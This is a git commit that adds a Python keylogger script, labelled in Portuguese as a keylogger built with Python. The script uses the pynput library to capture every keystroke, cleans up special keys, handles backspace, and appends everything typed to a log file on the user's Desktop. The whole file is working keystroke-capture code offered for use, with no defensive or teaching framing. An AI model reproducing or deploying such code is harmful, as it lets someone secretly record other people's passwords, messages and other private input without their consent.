eae8ed4aa49b864d03e2529f6f71574d2454aac6
makalau <marcelovictor95@hotmail.com>
2022-11-08 04:40:39 -0300

    KeyLogger criado com Python

---
+++ keylogger.py
@@ -0,0 +1,52 @@
+﻿from pynput import keyboard
+from pathlib import Path
+import os
+
+user = os.path.expanduser("~")
+caminho = f"{user}\Desktop"
+
+def main(key):
+
+    if str(key) == "Key.backspace":
+        with open(f"{caminho}\log.txt", "r") as archive:
+            copia = archive.readlines()
+        if len(copia) > 0:
+            new = copia[-1][:-1]
+            copia.pop()
+            copia.append(new)
+            with open(f"{caminho}\log.txt", "w") as archive:
+                archive.writelines(copia)
+
+    teclas = str(key)
+
+    words = {
+                "Key.space":" ",
+		"Key.enter":"\n",
+		"Key.shift_l":"",
+		"Key.alt":"",
+		"Key.esc": "",
+		"Key.cmd":"",
+		"Key.caps_lock": "",
+                "Key.ctrl_l":"",
+                "Key.down":"",
+                "Key.up":"",
+                "Key.shift_r":"",
+                "Key.backspace": "",
+		}
+    
+    teclas = teclas.replace("'", "")
+    teclas = teclas.replace("[", "")
+    teclas = teclas.replace("]", "")
+
+    for key in words:
+        teclas =  teclas.replace(key, words[key])
+
+    with open(f"{caminho}\log.txt", "a") as archive:
+        archive.write(teclas)
+
+try:
+    with keyboard.Listener(on_press=main) as archive:
+        archive.join()
+
+except KeyboardInterrupt:
+    print("Programa finalizado com Sucesso!!")
